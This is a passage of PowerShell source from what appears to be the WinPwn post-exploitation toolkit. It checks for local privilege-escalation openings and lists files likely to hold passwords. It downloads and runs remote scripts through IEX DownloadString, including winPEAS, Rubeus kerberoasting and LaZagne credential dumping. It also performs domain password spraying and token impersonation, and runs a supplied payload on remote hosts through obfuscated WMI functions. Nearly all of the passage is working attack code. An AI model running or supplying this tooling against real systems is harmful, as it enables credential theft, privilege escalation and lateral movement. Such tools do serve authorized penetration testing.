        Write "-------> Loaded DLLs permissions - backdoor DLL:"
        $result = $null
        $result = ForEach ($item in (Get-WmiObject -Class CIM_ProcessExecutable)) { [wmi]"$($item.Antecedent)" | Where-Object {$_.Extension -eq 'dll'} | Select Name | ForEach-Object { $o = $_.Name; (Get-Acl $o 2> $null).Access } | ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on $o" } } } }
        if ($result -ne $null) { Write $result | Sort -Unique; $result } else { Write "Permissions set on loaded DLLs are correct for all groups." }
     }    
     if(!$consoleoutput){
        Write "Files that may contain passwords:"
        $i = 0
        if (Test-Path $env:SystemDrive\sysprep.inf) { Write "$env:SystemDrive\sysprep.inf" >> $currentPath\LocalPrivEsc\Passwordfiles.txt  ; $i = 1}
        if (Test-Path $env:SystemDrive\sysprep\sysprep.xml) { Write "$env:SystemDrive\sysprep\sysprep.xml" >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if (Test-Path $env:WINDIR\Panther\Unattend\Unattended.xml) { Write "$env:WINDIR\Panther\Unattend\Unattended.xml" >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if (Test-Path $env:WINDIR\Panther\Unattended.xml) { Write "$env:WINDIR\Panther\Unattended.xml" >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if (Test-Path $env:WINDIR\system32\sysprep\Unattend.xml) { Write "$env:WINDIR\system32\sysprep\Unattend.xml" >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if (Test-Path $env:WINDIR\system32\sysprep\Panther\Unattend.xml) { Write "$env:WINDIR\system32\sysprep\Panther\Unattend.xml" >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if (Test-Path $env:WINDIR\Panther\Unattend\Unattended.xml) { Write "$env:WINDIR\Panther\Unattend\Unattended.xml" >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if (Test-Path $env:WINDIR\Panther\Unattend.xml) { Write "$env:WINDIR\Panther\Unattend.xml" >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if (Test-Path $env:SystemDrive\MININT\SMSOSD\OSDLOGS\VARIABLES.DAT) { Write "$env:SystemDrive\MININT\SMSOSD\OSDLOGS\VARIABLES.DAT" >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if (Test-Path $env:WINDIR\panther\setupinfo) { Write "$env:WINDIR\panther\setupinfo" >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if (Test-Path $env:WINDIR\panther\setupinfo.bak) { Write "$env:WINDIR\panther\setupinfo.bak" >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if (Test-Path $env:SystemDrive\unattend.xml) { Write "$env:SystemDrive\unattend.xml" >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if (Test-Path $env:WINDIR\system32\sysprep.inf) { Write "$env:WINDIR\system32\sysprep.inf" >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if (Test-Path $env:WINDIR\system32\sysprep\sysprep.xml) { Write "$env:WINDIR\system32\sysprep\sysprep.xml" >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if (Test-Path $env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\Config\web.config) { Write "$env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\Config\web.config" >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if (Test-Path $env:SystemDrive\inetpub\wwwroot\web.config) { Write "$env:SystemDrive\inetpub\wwwroot\web.config" >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if (Test-Path "$env:AllUsersProfile\Application Data\McAfee\Common Framework\SiteList.xml") { Write "$env:AllUsersProfile\Application Data\McAfee\Common Framework\SiteList.xml" >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if (Test-Path HKLM:\SOFTWARE\RealVNC\WinVNC4) { Get-ChildItem -Path HKLM:\SOFTWARE\RealVNC\WinVNC4 >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if (Test-Path HKCU:\Software\SimonTatham\PuTTY\Sessions) { Get-ChildItem -Path HKCU:\Software\SimonTatham\PuTTY\Sessions >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if ($i -eq 0) { Write "Files not found."}
        else {$out = get-content $currentPath\LocalPrivEsc\Passwordfiles.txt; $out }
    }
    else
    {
        Write "-------> Files that may contain passwords:"
        $i = 0
        if (Test-Path $env:SystemDrive\sysprep.inf) { Write "$env:SystemDrive\sysprep.inf" ; $i = 1}
        if (Test-Path $env:SystemDrive\sysprep\sysprep.xml) { Write "$env:SystemDrive\sysprep\sysprep.xml" ; $i = 1 }
        if (Test-Path $env:WINDIR\Panther\Unattend\Unattended.xml) { Write "$env:WINDIR\Panther\Unattend\Unattended.xml" ; $i = 1 }
        if (Test-Path $env:WINDIR\Panther\Unattended.xml) { Write "$env:WINDIR\Panther\Unattended.xml" ;$i = 1 }
        if (Test-Path $env:WINDIR\system32\sysprep\Unattend.xml) { Write "$env:WINDIR\system32\sysprep\Unattend.xml" ; $i = 1 }
        if (Test-Path $env:WINDIR\system32\sysprep\Panther\Unattend.xml) { Write "$env:WINDIR\system32\sysprep\Panther\Unattend.xml" ; $i = 1 }
        if (Test-Path $env:WINDIR\Panther\Unattend\Unattended.xml) { Write "$env:WINDIR\Panther\Unattend\Unattended.xml" ; $i = 1 }
        if (Test-Path $env:WINDIR\Panther\Unattend.xml) { Write "$env:WINDIR\Panther\Unattend.xml" ; $i = 1 }
        if (Test-Path $env:SystemDrive\MININT\SMSOSD\OSDLOGS\VARIABLES.DAT) { Write "$env:SystemDrive\MININT\SMSOSD\OSDLOGS\VARIABLES.DAT" ; $i = 1 }
        if (Test-Path $env:WINDIR\panther\setupinfo) { Write "$env:WINDIR\panther\setupinfo" ; $i = 1 }
        if (Test-Path $env:WINDIR\panther\setupinfo.bak) { Write "$env:WINDIR\panther\setupinfo.bak" ; $i = 1 }
        if (Test-Path $env:SystemDrive\unattend.xml) { Write "$env:SystemDrive\unattend.xml" ; $i = 1 }
        if (Test-Path $env:WINDIR\system32\sysprep.inf) { Write "$env:WINDIR\system32\sysprep.inf" ; $i = 1 }
        if (Test-Path $env:WINDIR\system32\sysprep\sysprep.xml) { Write "$env:WINDIR\system32\sysprep\sysprep.xml" ; $i = 1 }
        if (Test-Path $env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\Config\web.config) { Write "$env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\Config\web.config" ; $i = 1 }
        if (Test-Path $env:SystemDrive\inetpub\wwwroot\web.config) { Write "$env:SystemDrive\inetpub\wwwroot\web.config" ; $i = 1 }
        if (Test-Path "$env:AllUsersProfile\Application Data\McAfee\Common Framework\SiteList.xml") { Write "$env:AllUsersProfile\Application Data\McAfee\Common Framework\SiteList.xml" ; $i = 1 }
        if (Test-Path HKLM:\SOFTWARE\RealVNC\WinVNC4) { Get-ChildItem -Path HKLM:\SOFTWARE\RealVNC\WinVNC4 ; $i = 1 }
        if (Test-Path HKCU:\Software\SimonTatham\PuTTY\Sessions) { Get-ChildItem -Path HKCU:\Software\SimonTatham\PuTTY\Sessions ; $i = 1 }
        if ($i -eq 0) { Write "Files not found."}
        else {$out = get-content $currentPath\LocalPrivEsc\Passwordfiles.txt; $out }
    }
    If (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) 
    {
        Write-Warning "This script will not function with administrative privileges. Please run as a normal user."
        Break
    }
    Write-Host -ForegroundColor Yellow 'Looking for Writable PATH variable folders:'
    #Credit here https://gist.github.com/wdormann/eb714d1d935bf454eb419a34be266f6f 
    $outfile = "acltestfile"
    set-variable -name paths -value (Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment' -Name PATH).path.Split(";")
    Write "-------> Writable PATH Variable folders:"
    Foreach ($path in $paths) 
    {
        Try {
                [io.file]::OpenWrite("$path\$outfile").close()
                Write-Warning "I can write to '$path'"
              if(!$consoleoutput){echo $path >> $currentPath\LocalPrivEsc\Writable_PATH_Variable_Folder.txt}else{echo $path}
                $insecure = 1
            }
            Catch {}
    }
    If ($insecure -eq 1) {
        Write-Warning "Any directory above is in the system-wide directory list, but can also be written to by the current user."
        Write-Host "This can allow privilege escalation." -ForegroundColor Red
    } Else {
        Write-Host "Looks good! No system path can be written to by the current user." -ForegroundColor Green
    }
    if(!$consoleoutput){Reg1c1de >> $currentPath\LocalPrivEsc\WritebleRegistryKeys.txt}
}

function winPEAS
{
    # https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS wrapped in powershell
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )

    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName

    REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1 /f
    if (!$noninteractive){invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-winPEAS.ps1'');Invoke-winPEAS -command '' '';pause}'}
    if ($noninteractive)
    {
        IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-winPEAS.ps1')
        if(!$consoleoutput){Invoke-winPEAS -command ' ' >> $currentPath\LocalPrivEsc\winPEAS.txt}else{Invoke-winPEAS -command 'cmd'}
    }
    REG DELETE HKCU\Console\ /v VirtualTerminalLevel /f
}

function Reg1c1de
{
  IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Invoke-Reg1c1de.ps1')
  Invoke-Reg1c1de
}

function Privescmodules
{
  <#
        .DESCRIPTION
        All privesc scripts are executed here.
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>
    #Privilege Escalation Phase
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName

    @'
             
__        ___       ____                 
\ \      / (_)_ __ |  _ \__      ___ __  
 \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
  \ V  V / | | | | |  __/ \ V  V /| | | |
   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
   --> local Privilege Escalation checks
'@
        if($noninteractive -and (!$consoleoutput))
        {
            itm4nprivesc
            winPEAS
            oldchecks
            otherchecks
            return
        }
        elseif($noninteractive -and $consoleoutput)
        {
            itm4nprivesc -noninteractive -consoleoutput
            winPEAS -noninteractive -consoleoutput
            oldchecks -noninteractive -consoleoutput
            otherchecks -noninteractive -consoleoutput
            return
        }

        
        do
        {
            Write-Host "================ WinPwn ================"
            Write-Host -ForegroundColor Green '1. itm4ns Invoke-PrivescCheck'
            Write-Host -ForegroundColor Green '2. winPEAS! '
            Write-Host -ForegroundColor Green '3. Powersploits privesc checks! '
            Write-Host -ForegroundColor Green '4. All other checks! '
            Write-Host -ForegroundColor Green '5. Go back '
            Write-Host "================ WinPwn ================"
            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
            
            Switch ($masterquestion) 
            {
                1{itm4nprivesc}
                2{winPEAS}
                3{oldchecks}
                4{otherchecks}
            }
        }
        While ($masterquestion -ne 5)  

}

function TokenManipulation
{
  <#
        .DESCRIPTION
        Token Manipulation / Impersonation.
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>
    #Post Exploitation
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName

    @'
             
__        ___       ____                 
\ \      / (_)_ __ |  _ \__      ___ __  
 \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
  \ V  V / | | | | |  __/ \ V  V /| | | |
   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
   --> Token Manipulation
'@
        if (isadmin)
        {


        do
        {
            Write-Host "================ WinPwn ================"
            Write-Host -ForegroundColor Green '1. List possible users to impersonate and enumerate via Windows API (slow, stealthier)!'
            Write-Host -ForegroundColor Green '2. List possible users to impersonate via WMI (fast, less stealthy)! '
            Write-Host -ForegroundColor Green '3. Spawn a new cmd as another user! '
            Write-Host -ForegroundColor Green '4. Duplicate another users Token and set it for this process! '
            Write-Host -ForegroundColor Green '5. Same as (3) but use WMI for enumeration (DInvoke enumeration causes some problems on eg WS2012 or older Systems, WMI should still work)! '
            Write-Host -ForegroundColor Green '6. Same as (4) but use WMI for enumeration! '
            Write-Host -ForegroundColor Green '7. Spawn a new cmd as another user and impersonate a given Process-ID! '
            Write-Host -ForegroundColor Green '8. Duplicate a given Process-ID Token and set it for this process! '
            Write-Host -ForegroundColor Green '9. Go back '
            Write-Host "================ WinPwn ================"
            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
            
            Switch ($masterquestion) 
            {
                1{SharpImpersonation -list}
                2{SharpImpersonation -listwmi}
                3{SharpImpersonation}
                4{SharpImpersonation -CurrentThread}
                5{SharpImpersonation -wmi}
                6{SharpImpersonation -wmi -CurrentThread}
                7{$procID = Read-Host -Prompt 'Please enter the target Process ID to impersonate:';SharpImpersonation -procID $procID}
                8{$procID = Read-Host -Prompt 'Please enter the target Process ID to impersonate:';SharpImpersonation -procID $procID -CurrentThread}
            }
        }
        While ($masterquestion -ne 9)
        
        }
        else
        {
             @'
             
     __                ___  ___  __     ___  __      __   ___          __               
\ / /  \ |  |    |\ | |__  |__  |  \     |  /  \    |__) |__      /\  |  \  |\/| | |\ | 
 |  \__/ \__/    | \| |___ |___ |__/     |  \__/    |__) |___    /~~\ |__/  |  | | | \| 
                                                                                        

'@   

        }

}

function SharpImpersonation
{
[CmdletBinding()]
    Param (
        [Switch]
        $list,
        [Switch]
        $listwmi,
        [Switch]
        $wmi,
        [Switch]
        $CurrentThread,
        [string]
        $username = "",
        [string]
        $procID = ""
    )

if (isadmin)
{

IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpImpersonationNoSpace.ps1')


if ($list)
{
    Invoke-SharpImpersonation -Command "list"
    return
}
elseif($listwmi)
{
    Invoke-SharpImpersonation -Command "list#wmi"
    return
}

if ($procID -cne "")
{
    if ($CurrentThread)
    {
        Invoke-SharpImpersonation -Command "pid:$procID#technique:ImpersonateLoggedOnuser"
    }
    else
    {
        Invoke-SharpImpersonation -Command "pid:$procID"
    }
    return
}

if($username -eq "")
{
    $username = Read-Host -Prompt 'Please enter the username to impersonate:'
}

$parameters = "user:$username"
if($wmi)
{
    $parameters += "#wmi"
}
if ($CurrentThread)
{
    $parameters += "#technique:ImpersonateLoggedOnuser"
}
Write-Host "Using parameters $parameters"
Invoke-SharpImpersonation -Command "$parameters"


}
else

{

@'
             
     __                ___  ___  __     ___  __      __   ___          __               
\ / /  \ |  |    |\ | |__  |__  |  \     |  /  \    |__) |__      /\  |  \  |\/| | |\ | 
 |  \__/ \__/    | \| |___ |___ |__/     |  \__/    |__) |___    /~~\ |__/  |  | | | \| 
                                                                                        

'@                                                                                        

}

}

function laZagnemodule
{
    <#
        .DESCRIPTION
        Downloads and executes Lazagne from AlessandroZ for Credential gathering / privilege escalation.
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>
    #Privilege Escalation Phase
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName

    if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
	{
		Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/blob/master/exeFiles/wincreds.exe?raw=true' -Outfile $currentPath\WinCreds.exe
	}
	else
	{
		Invoke-WebRequest -Uri ($S3cur3Th1sSh1t_repo + '/Creds/master/exeFiles/wincreds.exe') -Outfile $currentPath\WinCreds.exe
	}
    Write-Host -ForegroundColor Yellow 'Checking, if the file was killed by antivirus:'
    if (Test-Path $currentPath\WinCreds.exe)
    {
        Write-Host -ForegroundColor Yellow 'Not killed, Executing:'
      if(!$consoleoutput){mkdir $currentPath\Lazagne}
        if(!$consoleoutput){.\WinCreds.exe all >> "$currentPath\Lazagne\Passwords.txt"}else{.\WinCreds.exe all}
        Write-Host -ForegroundColor Yellow 'Results saved to $currentPath\Lazagne\Passwords.txt!'
    }
    else {Write-Host -ForegroundColor Red 'Antivirus got it, try an obfuscated version or In memory execution with Pupy:'}
}

function latmov
{
    <#
        .DESCRIPTION
        Looks for administrative Access on any system in the current network/domain. If Admin Access is available somewhere, Credentials can be dumped remotely / alternatively Powershell_Empire Stager can be executed.
        Brute Force for all Domain Users with specific Passwords (for example Summer2018) can be done here.
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>
    #Lateral Movement Phase
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName

    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/DomainPasswordSpray.ps1')
    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/view.ps1')
    $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
    
    
    Write-Host -ForegroundColor Yellow 'Starting Lateral Movement Phase:'

    Write-Host -ForegroundColor Yellow 'Searching for Domain Systems we can pwn with admin rights, this can take a while depending on the size of your domain:'

    fuller >> $currentPath\Exploitation\LocalAdminAccess.txt

    $exploitdecision = Read-Host -Prompt 'Do you want to execite code remotely on all found Systems? (yes/no)'
    if ($exploitdecision -eq "yes" -or $exploitdecision -eq "y")
    {
        launcher
    }
}

function Domainpassspray
{
    <#
        .DESCRIPTION
        Domain password spray, credit to https://github.com/dafthack/.
    #>
    #Lateral Movement Phase
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput,
    [Switch]
        $emptypasswords,
    [Switch]
        $usernameaspassword,
        [String]
        $password,   
    [Switch]
        $pre2k
)
    
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/DomainPasswordSpray.ps1')
    $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name

    if($pre2k)
    {
        IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Pre2kSpray.ps1')
	if(!$consoleoutput){Invoke-Pre2kSpray -Force -outfile $currentPath\Exploitation\Pre2kPasswords.txt}
	else
	{
	  Invoke-Pre2kSpray -Force
	}
    }
    
    if ($emptypasswords)
    {
      IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1')
    if(!$consoleoutput){Invoke-SprayEmptyPassword -outfile $currentPath\Exploitation\EmptyPasswords.txt}
    else
    {
      Invoke-SprayEmptyPassword
    }
    }
    elseif($usernameaspassword)
    {
        if(!$consoleoutput){Get-DomainUserList -Domain $domain.Name | Out-File -Encoding ascii $currentPath\DomainRecon\userlist.txt}else{$list = Get-DomainUserList -Domain $domain.Name}
        if(!$consoleoutput){Invoke-DomainPasswordSpray -UserList $currentPath\DomainRecon\userlist.txt -UsernameAsPassword -Domain $domain.Name -OutFile $currentPath\Exploitation\UsernameAsPasswordCreds.txt}else{Invoke-DomainPasswordSpray -UserList $list -Domain $domain.Name -UsernameAsPassword}  
        if(!$consoleoutput){Write-Host "Successfull logins saved to $currentPath\Exploitation\UsernameAsPasswordCreds.txt"} 
    }
    else
    {    	  	
      if(!$consoleoutput){Get-DomainUserList -Domain $domain.Name -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii $currentPath\DomainRecon\userlist.txt}else{$list = Get-DomainUserList -Domain $domain.Name -RemoveDisabled -RemovePotentialLockouts}
        if (Test-Path $currentPath\passlist.txt) 
        {
          Invoke-DomainPasswordSpray -UserList $currentPath\DomainRecon\userlist.txt -Domain $domain_Name.Name -PasswordList $currentPath\passlist.txt -OutFile $currentPath\Exploitation\Pwned-creds_Domainpasswordspray.txt
        }
        else 
        { 
           if(!$consoleoutput){$onepass = Read-Host -Prompt 'Please enter one Password for DomainSpray manually:'}
           if(!$consoleoutput){Invoke-DomainPasswordSpray -UserList $currentPath\DomainRecon\userlist.txt -Domain $domain.Name -Password $onepass -OutFile $currentPath\Exploitation\Pwned-creds_Domainpasswordspray.txt}else{Invoke-DomainPasswordSpray -UserList $list -Domain $domain.Name -Password $password}  
           if(!$consoleoutput){Write-Host "Successfull logins saved to $currentPath\Exploitation\Pwned-creds_Domainpasswordspray.txt"}
    }
   }
}

function launcher
{
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName

    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/wmicmd.ps1')
    if (Test-Path $currentPath\Exploitation\LocalAdminAccess.txt)
    {
        $exploitHosts = Get-Content "$currentPath\Exploitation\LocalAdminAccess.txt"
    }
    else
    {
        $file = "$currentPath\Exploitation\Exploited.txt"
        While($i -ne "quit") 
        {
          If ($i -ne $NULL) 
            {
            $i.Trim() | Out-File $file -append
          }
          $i = Read-Host -Prompt 'Please provide one or more IP-Adress as target:'    
        }

    }

    $stagerfile = "$currentPath\Exploitation\Stager.txt"
    While($Payload -ne "quit") 
    {
      If ($Payload -ne $NULL) 
        {
          $Payload.Trim() | Out-File $stagerfile -append
      }
        $Payload = Read-Host -Prompt 'Please provide the code to execute :'
    }
    
    $executionwith = Read-Host -Prompt 'Use the current User for Payload Execution? (yes/no):'

    if (Test-Path $currentPath\Exploitation\Exploited.txt)
    {
        $Hosts = Get-Content "$currentPath\Exploitation\Exploited.txt"
    }
    else {$Hosts = Get-Content "$currentPath\Exploitation\LocalAdminAccess.txt"}

    if ($executionwith -eq "yes" -or $executionwith -eq "y" -or $executionwith -eq "Yes" -or $executionwith -eq "Y")
    {
        $Hosts | bootblacks -OnVxcvnOYdGIHyL $Payload
    }
    else 
    {
        $Credential = Get-Credential
        $Hosts | bootblacks -OnVxcvnOYdGIHyL $Payload -bOo9UijDlqABKpS $Credential
    }
}

function Shareenumeration
{
    <#
        .DESCRIPTION
        Enumerates Shares in the current network, also searches for sensitive Files on the local System + Network.
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>
    #Enumeration Phase
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName

    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/view.ps1')
    Write-Host -ForegroundColor Yellow 'Searching for sensitive Files on the Domain-Network, this can take a while:'
    if(!$consoleoutput){Claire >> $currentPath\SensitiveFiles.txt}else{Claire}
    if(!$consoleoutput){shift -qgsNZggitoinaTA >> $currentPath\Networkshares.txt}else{shift -qgsNZggitoinaTA}
}

function groupsearch
{
    <#
        .DESCRIPTION
        AD can be searched for specific User/Group Relations over Group Policies.
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>
    #Enumeration Phase
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName

    iex ($viewdevobfs)
    $user = Read-Host -Prompt 'Do you want to search for other users than the session-user? (yes/no)'
            if ($user -eq "yes" -or $user -eq "y" -or $user -eq "Yes" -or $user -eq "Y")
            {
                Write-Host -ForegroundColor Yellow 'Please enter a username to search for:'
                $username = Get-Credential
                $group = Read-Host -Prompt 'Please enter a Group-Name to search for: (Administrators,RDP)'
                Write-Host -ForegroundColor Yellow 'Searching...:'
                rewires -LocalGroup $group -Credential $username >> $currentPath\Groupsearches.txt
            }
            else
            {
                $group = Read-Host -Prompt 'Please enter a Group-Name to search for: (Administrators,RDP)'
                Write-Host -ForegroundColor Yellow 'Searching...:'
                rewires -LocalGroup $group -Identity $env:UserName >> $currentPath\Groupsearches.txt
                Write-Host -ForegroundColor Yellow 'Systems saved to >> $currentPath\Groupsearches.txt:'
            }
}

function proxydetect
{
    <#
        .DESCRIPTION
        Checks, if a proxy is active. Uses current users credentials for Proxy Access / other user input is possible as well.
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>    
    #Proxy Detect #1
    
    Write-Host -ForegroundColor Yellow 'Searching for network proxy...'

    $reg2 = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('CurrentUser', $env:COMPUTERNAME)
    $regkey2 = $reg2.OpenSubkey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings")

    if ($regkey2.GetValue('ProxyServer') -and $regkey2.GetValue('ProxyEnable'))
    {
        $proxy = Read-Host -Prompt 'Proxy detected! Proxy is: '$regkey2.GetValue('ProxyServer')'! Does the Powershell-User have proxy rights? (yes/no)'
        if ($proxy -eq "yes" -or $proxy -eq "y" -or $proxy -eq "Yes" -or $proxy -eq "Y")
        {
             #Proxy
            Write-Host -ForegroundColor Yellow 'Setting up Powershell-Session Proxy Credentials...'
            $Wcl = new-object System.Net.WebClient
            $Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
        }
        else
        {
            Write-Host -ForegroundColor Yellow 'Please enter valid credentials, or the script will fail!'
            #Proxy Integration manual user
            $webclient=New-Object System.Net.WebClient
            $creds=Get-Credential
            $webclient.Proxy.Credentials=$creds
        }
   }
    else {Write-Host -ForegroundColor Yellow 'No proxy detected, continuing... '}
}

function Kerberoasting
{
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    #Exploitation Phase
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName

    Write-Host -ForegroundColor Red 'Kerberoasting active:'
        
    Write-Host -ForegroundColor Yellow 'Doing Kerberoasting + ASRepRoasting using rubeus. Output goes to .\Exploitation\'
    iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
    if(!$consoleoutput){Invoke-Rubeus -Command "asreproast /format:hashcat /nowrap /outfile:$currentPath\Exploitation\ASreproasting.txt"}else{Invoke-Rubeus -Command "asreproast /format:hashcat /nowrap"}
    if(!$consoleoutput){Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap /outfile:$currentPath\Exploitation\Kerberoasting_Rubeus.txt"}else{Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap"}
  Write-Host -ForegroundColor Yellow 'Using the powershell version as backup: '
}

function inv-phantom {
    if (isadmin)
    {
        IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/phantom.ps1')
        phantom
    }
    else 
    { 
        Write-Host -ForegroundColor Yellow 'You are not admin, do something else for example Privesc :-P'
        Sleep 3;
    }
}

filter ConvertFrom-SDDL
{
  <#
      .SYNOPSIS
      Author: Matthew Graeber (@mattifestation)
      .LINK
      http://www.exploit-monday.com
  #>

    Param (
        [Parameter( Position = 0, Mandatory = $True, ValueFromPipeline = $True )]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $RawSDDL
    )

    $RawSDDL = $RawSDDL -replace "`n|`r"
    Set-StrictMode -Version 2

    # Get reference to sealed RawSecurityDescriptor class
    $RawSecurityDescriptor = [Int].Assembly.GetTypes() | ? { $_.FullName -eq 'System.Security.AccessControl.RawSecurityDescriptor' }

    # Create an instance of the RawSecurityDescriptor class based upon the provided raw SDDL
    try
    {
        $Sddl = [Activator]::CreateInstance($RawSecurityDescriptor, [Object[]] @($RawSDDL))
    }
    catch [Management.Automation.MethodInvocationException]
    {
        throw $Error[0]
    }
    if ($Sddl.Group -eq $null)
    {
        $Group = $null
    }
    else
    {
        $SID = $Sddl.Group
        $Group = $SID.Translate([Security.Principal.NTAccount]).Value
    }
    if ($Sddl.Owner -eq $null)
    {
        $Owner = $null
    }
    else
    {
        $SID = $Sddl.Owner
        $Owner = $SID.Translate([Security.Principal.NTAccount]).Value
    }
    $ObjectProperties = @{
